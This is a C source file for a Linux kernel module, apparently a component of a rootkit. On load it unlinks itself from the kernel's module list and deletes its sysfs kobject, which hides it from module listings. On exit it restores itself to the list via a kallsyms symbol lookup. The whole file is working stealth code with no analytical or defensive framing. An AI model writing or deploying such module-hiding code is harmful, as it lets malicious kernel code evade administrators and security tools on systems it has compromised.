#include <linux/list.h>
#include <linux/module.h>
#include <linux/kobject.h>

#include "module.h"

#include "../../sys/symbol.h"

// module_init already exists in module.h
int module_init_(void)
{
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    return 0;
}

int module_exit_(void)
{
    struct list_head *modules = (struct list_head*)get_kallsyms_lookup_name()("modules");

    list_add(&THIS_MODULE->list, modules);
    
    // sysfs is not mission critical, so no need to expose it, however, would be nice if `struct load_info*` of THIS_MODULE could be found
    //mod_sysfs_setup(THIS_MODULE, ..., &THIS_MODULE->kp, THIS_MODULE->num_kp);

    return 0;
}